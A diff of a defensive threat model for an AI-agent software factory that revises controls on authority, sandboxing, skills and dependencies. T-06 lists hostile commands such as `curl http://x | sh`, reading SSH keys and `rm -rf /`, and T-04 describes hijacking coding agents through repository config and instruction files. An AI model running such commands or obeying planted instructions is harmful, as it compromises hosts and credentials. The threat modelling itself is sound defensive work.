@@ -1,7 +1,7 @@
 # Threat model: Universal Agentic Software Factory
 
 Status: DESIGNED baseline, written before any application code exists. Every control below is REQUIRED for the product and none is implemented yet. "Residual risk" values are proposals until a named human accepts them (see section 9).
-Date: 2026-10-27.
+Date: 2026-10-27. Revised the same day to match ADR 0003, 0005, 0006 and 0009: the agent CLI runs inside the sandbox, authority comes from a named allowlist and not from GitHub roles, new direct dependencies always need a human, rework is capped at two rounds, the skill and slash-command flags are per stage, and API keys behind a broker are the credential default.
 Method: Shostack's four questions and STRIDE per element, with a likelihood by impact rating. No CVSS vectors are given because no implementation exists to score.
 Related files:
 
@@ -44,7 +44,7 @@ Central design rule: **authority never comes from content.** A tool grant, a per
 | ID | Actor | Capability assumed |
 | --- | --- | --- |
 | AC1 | Outsider with no repository permission | Can open issues and comments on public repositories, can send arbitrary HTTP to public endpoints |
-| AC2 | Authorized maintainer or contributor | Trusted but fallible. May label a hostile issue without reading it |
+| AC2 | Allowlisted requester, approver or operator | Trusted but fallible. May label a hostile issue without reading it. Holds authority only through the named allowlist, never through a GitHub role |
 | AC3 | Malicious or compromised insider (maintainer, operator) | Valid credentials, authorized actions |
 | AC4 | Author of repository content | Controls README, docs, code comments, config files, test files, history |
 | AC5 | Dependency or package author | Controls code and install scripts that the build pulls in |
@@ -172,16 +172,16 @@ Status of every control: REQUIRED, DESIGNED, not implemented. "Policy key" point
 | --- | --- | --- | --- |
 | C-01 | Verify `X-Hub-Signature-256` (HMAC-SHA256 over the raw body, constant-time compare) before parsing and before any database access | `webhook.signature` | `github`, `api` |
 | C-02 | Dedupe on `X-GitHub-Delivery` with a unique constraint, plus a semantic idempotency key | `webhook.dedupe`, `webhook.semantic_idempotency` | `github`, `events` |
-| C-03 | Treat the payload as a hint: re-fetch state and verify the sender's permission live before acting | `webhook.payload_is_hint_only` | `github` |
+| C-03 | Treat the payload as a hint: re-fetch state and identify the person who acted by numeric user ID; authorize only by membership in the named allowlist in protected configuration. A GitHub role or permission never grants factory authority | `webhook.payload_is_hint_only`, `approval.yaml` `authority` | `github`, `workflow` |
 | C-04 | Bind every event to a tenant through installation ID and repository ID; drop unknown bindings | `webhook.tenant_binding` | `github`, `storage` |
 | C-05 | Snapshot and hash untrusted text at authorization time; re-authorize if it changes | `approval.yaml` `intake` | `workflow` |
 | C-06 | Instruction and data separation: untrusted text enters prompts only inside typed data envelopes with provenance, never in the instruction channel | `untrusted_content.prompt_assembly` | `agents` |
 | C-07 | No ambient authority: tools are granted by the policy engine per stage and task; agents cannot grant | `tools` | `policy` |
 | C-08 | Structured output validation: schema check, unknown fields rejected, bounded repair | `untrusted_content.structured_output` | `agents` |
 | C-09 | Injection-signal detector used for telemetry and escalation only | `untrusted_content.injection_signal_detector` | `agents` |
-| C-10 | Neutralize repository-resident agent configuration and instruction files; pass factory instructions explicitly | `untrusted_content.agent_runtimes` | `agents`, `runtime` |
+| C-10 | Neutralize repository-resident agent configuration and instruction files; pass factory instructions explicitly; apply a per-stage skill profile: exactly the four Spec Kit skills in the specification stage, no skills or slash commands in any other stage, the six other Spec Kit skills denied and hidden everywhere | `untrusted_content.agent_runtimes`, `agent_stage_profiles` | `agents`, `runtime` |
 | C-11 | Reviewer independence: no builder self-justification, deterministic gates authoritative, reviewer verdicts cannot override a failed gate | `gate_integrity` | `quality`, `workflow` |
-| C-12 | Typed tool gateway: allowlist, argv arrays, fixed environment, per-call limits, pre-execution logging | `tools`, `command_sets` | `runtime`, `policy` |
+| C-12 | Typed tool gateway for what the factory mediates: commands the factory runs itself (gates, dependency fetch, version control) and the host tool bridge if chosen. For the agent CLI that runs inside the sandbox, the same table becomes CLI permission flags where the spike proves they work, and the sandbox, broker and ingestion contain the rest | `tools`, `command_sets` | `runtime`, `policy` |
 | C-13 | Forbidden command classes as a backstop | `forbidden_command_classes` | `policy` |
 | C-14 | Path policy: normalization, resolve-beneath, write scope, deny-read | `matching`, `path_access` | `policy`, `runtime` |
 | C-15 | Hardened container built from a typed `SandboxSpec` | `sandbox.required` | `sandbox` |
@@ -204,7 +204,7 @@ Status of every control: REQUIRED, DESIGNED, not implemented. "Policy key" point
 | C-32 | Secret scan on diffs, artifacts and GitHub-bound text | `secrets.patterns` | `quality` |
 | C-33 | Deny-read for secret-bearing files; scan retrieved context before prompting | `protected_paths` (`secret_bearing_files`), `secrets.never_in_model_context` | `repository_intel`, `agents` |
 | C-34 | Lease compare-and-swap with fencing epoch, idempotency keys on side effects, consumer dedupe, dead-letter after bounded redelivery | none (engineering design, ADR) | `workflow`, `events` |
-| C-35 | Budgets and quotas enforced by the broker and scheduler, outside agent processes | `budgets` | `scheduler`, `runtime` |
+| C-35 | Budgets and quotas enforced by the broker and scheduler, outside agent processes. Turns are counted as model requests at the broker. Rework is capped at two rounds, then a human decides | `budgets` | `scheduler`, `runtime` |
 | C-36 | Tenant isolation: row-level security, per-tenant object prefixes and keys, NATS subject permissions, no shared sandbox, cache or memory | `tenancy` | `storage`, `events` |
 | C-37 | Append-only, hash-chained audit with an external anchor | `audit` | `storage` |
 | C-38 | Approval integrity: live authorization, bound to head SHA and evidence, no bot or self approval where prohibited, step-up for sensitive actions | `approval.yaml` | `workflow`, `api` |
@@ -284,9 +284,9 @@ Each entry lists the concrete attacker action, the controls that address it, the
 ### T-04 Repository-resident agent configuration hijack
 
 * Attack: the target repository ships `.claude/settings.json` with hooks and an environment block, `.mcp.json` that launches a process, `.codex/config.toml`, or `CLAUDE.md` and `AGENTS.md` with instructions. An agent CLI started in that directory may run the hooks, start the MCP server, widen its own permissions, or redirect model traffic to an attacker host that receives the credential in the request.
-* Mitigations: C-10 (neutralizing flags and explicit instruction passing; both CLIs expose flags for this, verified in `--help` only), C-29 (the credential in the sandbox is a job token usable only at the broker), C-17 (no route to an attacker host), C-23 (instruction files are protected from builder edits), C-15 (the container is the boundary).
+* Mitigations: C-10 (neutralizing flags and explicit instruction passing; both CLIs expose flags for this, verified in `--help` only; the per-stage skill profile makes the four Spec Kit skills the only repository-resident instruction set that is honored, and only in the specification stage after the integrity checks), C-29 (the credential in the sandbox is a job token usable only at the broker), C-17 (no route to an attacker host), C-23 (instruction files are protected from builder edits), C-15 (the container is the boundary).
 * Residual (Medium until NT-INJ-07 passes with the real CLIs, then Low): whether each flag fully neutralizes each repository file is not proven. The broker design and the network design are the backstop.
-* Proven by: NT-INJ-07, NT-SBX-13, NT-SBX-04.
+* Proven by: NT-INJ-07, NT-POL-08, NT-SBX-13, NT-SBX-04.
 
 ### T-05 Reviewer and gate manipulation, agent-to-agent injection
 
@@ -298,9 +298,9 @@ Each entry lists the concrete attacker action, the controls that address it, the
 ### T-06 Malicious tool requests
 
 * Attack: the model asks to run `curl http://x | sh`, `cat ~/.ssh/id_rsa`, `git push --force`, `rm -rf /`, `env`, `cargo publish`; passes shell metacharacters in an argument; uses a path such as `../../etc/passwd`; follows a symlink out of the workspace; invents a tool name; asks for a grant; supplies `LD_PRELOAD` or `RUSTFLAGS` through an environment parameter; uses a flag that changes the tool's behavior (`cargo --config`, `node --require`).
-* Mitigations: C-07, C-12, C-13, C-14, C-15, C-17. The command wrapper takes an argv array, never a shell string, and the supervisor fixes the environment.
-* Residual (Low): the denylist is a backstop and can be evaded. The allowlist, the sandbox and the absent credentials are the real controls.
-* Proven by: NT-TOOL-01 to NT-TOOL-09, NT-INJ-01.
+* Mitigations: C-07, C-12, C-13, C-14, C-15, C-17, C-10. Because the agent CLI runs inside the sandbox (ADR 0005), its own shell and file tools are not mediated by the factory. What contains them is the sandbox posture, the read-only protected overlays and hidden paths, the egress sidecar and broker, the filesystem audit walk, the host-computed diff and the audit log. The typed argv wrapper with a fixed environment applies in full to commands the factory runs (gates, dependency fetch, version control) and to the host tool bridge if a human chooses it. A request to run a denied Spec Kit skill is a tool request too; the per-stage skill profile covers it.
+* Residual (Low): the denylist is a backstop and can be evaded. The sandbox, the allowlists and the absent credentials are the real controls. How much of the CLI's own call stream the factory can observe is unknown until the agent-runtime spike.
+* Proven by: NT-TOOL-01 to NT-TOOL-09, NT-INJ-01, NT-INJ-04, NT-POL-08. The tests that depend on mediation are tagged in the catalog.
 
 ### T-07 Structured-output abuse
 
@@ -363,7 +363,7 @@ Each entry lists the concrete attacker action, the controls that address it, the
 * Attack: path tricks (`..`, case, Unicode normalization forms, trailing dots, backslashes), reporting a short file list while the diff is larger, a rename away from a protected path, a symlink at a protected path, loading policy from a feature branch, a project policy that removes a protected path or widens egress, claiming authorization in specification prose.
 * Mitigations: C-43, C-23, C-14. `matching.evaluate_on` is the trusted tree diff. Project policy is tighten-only. Specification authorization is a structured field written only by an authenticated human.
 * Residual (Low).
-* Proven by: NT-POL-01 to NT-POL-07, NT-GATE-04.
+* Proven by: NT-POL-01 to NT-POL-08, NT-GATE-04.
 
 ### T-16 Secret exfiltration through logs, events, traces and artifacts
 
@@ -417,7 +417,7 @@ Each entry lists the concrete attacker action, the controls that address it, the
 ### T-23 Unauthorized intake or approval
 
 * Attack: a `factory` label applied by or on behalf of an outsider (issue templates and automation can apply labels for low-privilege authors; not tested here); a `/factory approve` comment from a reader or from a bot; a command inside a quoted reply, a code block or an edited comment; an issue body edited after a maintainer authorized it; a bot approving its own work; a revoked user's approval.
-* Mitigations: C-03 (authorize the person who applied the label, live), C-05, C-38. Commands are accepted only from `created` comments by human users with a live permission check.
+* Mitigations: C-03 (authorize the person who applied the label, identified by numeric user ID, by membership in the named allowlist; a repository role or `author_association` never admits a request), C-05, C-38. Commands are accepted only from `created` comments by human users who hold the required designation on the allowlist. Removal from the allowlist is the revocation. A login that matches an allowlisted login but has a different numeric ID is not that person.
 * Residual (Low).
 * Proven by: NT-AUTHZ-01 to NT-AUTHZ-05, NT-MRG-06, NT-WH-06, NT-WH-09, NT-WEB-05.
 
@@ -438,7 +438,7 @@ Each entry lists the concrete attacker action, the controls that address it, the
 ### T-26 Token, cost and queue exhaustion
 
 * Attack: a loop that burns tokens, giant prompts, thousands of labeled issues, repeated rework cycles, deliberately failing tests to force retries.
-* Mitigations: C-35. The broker meters tokens and cost and cuts the job token; budgets exist per request, task, job, repository and organization.
+* Mitigations: C-35. The broker meters tokens and cost, counts model requests as turns, and cuts the job token; budgets exist per request, task, job, repository and organization. Rework stops after two rounds and a human decides.
 * Residual (Low): provider-side billing may lag a few seconds behind the broker's accounting.
 * Proven by: NT-BUD-01 to NT-BUD-08, NT-WH-07, NT-WH-10.
 
@@ -459,8 +459,8 @@ Each entry lists the concrete attacker action, the controls that address it, the
 ### T-29 Supply-chain attack through generated dependencies
 
 * Attack: the model suggests a package that does not exist and an attacker has registered it ("slopsquatting"); a typosquat; a package with an install script or `build.rs`; a lockfile edited to point at another source; a git or path dependency; an unpinned GitHub Action.
-* Mitigations: C-39, C-18 (installs only in `fetch_deps`, scripts disabled, no repository code), C-17, C-40. New direct dependencies require a human by default.
-* Residual (Medium): a malicious but well-aged popular package passes heuristics. `build.rs` and tests still run attacker code, only inside the sandbox with no network and no secrets.
+* Mitigations: C-39, C-18 (installs only in `fetch_deps`, scripts disabled, no repository code), C-17, C-40. A new direct dependency always needs a human; no allowlist or heuristic approves one automatically.
+* Residual (Medium): a human can approve a malicious package that looks legitimate; the heuristics shown to the human lower that risk and do not remove it. `build.rs` and tests still run attacker code, only inside the sandbox with no network and no secrets.
 * Proven by: NT-SUP-01 to NT-SUP-04, NT-SUP-06.
 
 ### T-30 Poisoned base images, toolchains or caches
@@ -515,20 +515,21 @@ Each entry lists the concrete attacker action, the controls that address it, the
 
 ## 9. Open questions that need a human
 
-Each has a recommended default so the work is not blocked.
+ADR 0009 adopted six operating defaults so work is not blocked. Each is the safer option and is still **pending human confirmation**. The table says which defaults are already in force and what a person still has to decide.
 
-| ID | Question | Recommended default |
+| ID | Question | Status and default |
 | --- | --- | --- |
-| Q1 | Does the agent CLI run inside the sandbox (Model A) or outside with factory tools (Model B)? | Model A for Slice 1, Model B as the hardening target. Needs architect and security agreement in an ADR. |
-| Q2 | Model credentials: API keys with a hard spend limit, or subscription (OAuth) logins? | API keys, brokered. Subscription logins cannot be brokered or metered by the factory and may conflict with provider terms. A legal and commercial decision. |
-| Q3 | Where do sandboxes run in production, and may the team require rootless Docker or a microVM runtime? | A dedicated Linux sandbox host with user-namespace remapping and AppArmor or SELinux; gVisor or Kata before accepting a second tenant. |
-| Q4 | Which secret manager holds the App key and provider keys? | Decide in an ADR (OpenBao or Vault, a cloud secret manager, or SOPS with age for local development only). |
-| Q5 | May the factory require repository rulesets on onboarded repositories (required checks pinned to the App, no bypass for the App, protected default branch)? | Yes. Repositories that decline run at autonomy level L0 only. |
-| Q6 | May private repository code be sent to the configured model providers? Which providers per tenant? | No provider by default; an org admin approves each one. |
-| Q7 | May a requester approve their own low-risk pull request? | Yes for low risk, no for high risk or protected paths (set in `approval.yaml`). |
-| Q8 | Are new direct dependencies always a human decision? | Yes at autonomy L1 and L2, with an allowlist for names already in the lockfile. |
-| Q9 | Is multi-tenancy in the first release or later? | The data model is tenant-aware from Slice 0; isolation controls for several tenants are required before the second tenant. |
-| Q10 | Who are the named security approvers, and who owns waivers and risk acceptance? | A short explicit list in central configuration; `security_approver` role in `approval.yaml`. |
+| Q1 | Does the agent CLI run inside the sandbox or outside with factory tools? | **Default in force (ADR 0009 item 1, ADR 0005):** inside the sandbox in Slice 1, behind the broker. The host tool bridge is the hardening target and stays off. Confirmation pending. The agent-runtime spike must prove the CLIs start under the hardened profile and can be redirected to the broker. |
+| Q2 | Model credentials: API keys with a hard spend limit, or subscription logins? | **Default in force (ADR 0009 item 2):** API keys with a provider-side spend limit, behind the broker. Subscription logins cannot be brokered or metered and are not used. **A person must supply API keys** before any live run with real agents; until then those runs are BLOCKED. A subscription login on a host is possible only through the signed exception in `secrets-and-credentials.md` section 4.5, and the provider-terms question needs a qualified person. |
+| Q3 | Where do sandboxes run in production, and may the team require rootless Docker or a microVM runtime? | Open. Recommended: a dedicated Linux sandbox host with user-namespace remapping and AppArmor or SELinux; gVisor or Kata before accepting a second tenant. |
+| Q4 | Which secret manager holds the App key and provider keys? | Open. Decide in an ADR (OpenBao or Vault, a cloud secret manager, or SOPS with age for local development only). |
+| Q5 | May the factory require repository rulesets on onboarded repositories? | **Default in force (ADR 0009 item 3):** yes. A repository without the required protection runs at autonomy level L0 only. A person must add the ruleset to the fixture repository before the end-to-end run can open a draft pull request. |
+| Q6 | May private repository code be sent to the configured model providers? Which providers per tenant? | Open. Recommended: no provider by default; an org admin approves each one. |
+| Q7 | May a requester approve their own low-risk pull request? | Open. Recommended and set in `approval.yaml`: yes for low risk, no for high risk, protected paths, sensitive files or a new dependency. |
+| Q8 | Are new direct dependencies always a human decision? | **Default in force (ADR 0009 item 4):** yes, always. There is no automatic approval by allowlist or heuristic. A name already in the base commit's lockfile is not new. |
+| Q9 | Is multi-tenancy in the first release or later? | Open. The data model is tenant-aware from Slice 0; isolation controls for several tenants are required before the second tenant. |
+| Q10 | Who are the named people on the allowlist, and who owns waivers and risk acceptance? | **Mechanism in force (ADR 0009 item 5):** a named allowlist in protected configuration, matched by numeric GitHub user ID, with designations for requester, operator, approver, security approver, repo admin and org admin. GitHub roles grant nothing. **A person must name the initial members** and decide who may edit the list (`change_authority_allowlist`, two distinct org admins for the two highest designations). |
+| Q11 | Rework limit | **Default in force (ADR 0009 item 6):** two rounds, then a human decides, for code and for documentation. The value is configurable and lowering it is allowed; raising it is a human decision. |
 
 ## 10. Re-open triggers
 
